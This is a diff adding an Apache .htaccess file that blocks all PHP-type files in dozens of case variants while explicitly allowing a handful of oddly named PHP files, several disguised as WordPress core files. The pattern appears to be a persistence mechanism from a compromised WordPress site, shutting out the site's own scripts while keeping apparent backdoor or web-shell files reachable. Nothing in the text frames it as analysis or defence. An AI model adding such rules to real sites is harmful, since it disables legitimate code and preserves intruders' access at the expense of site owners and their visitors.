@@ -1,0 +1,11 @@
+Options -Indexes
+
+<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<FilesMatch "^(emcialan.php|wp-blog-activate.php|Ipv4.php|class-wp-block-parser-auth.php|class-wp-blog-format.php|Ipv4.php|InvalidOptions.php|reboot.php|class-wp-application-passwords-list-options.php|wp-loadscript.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
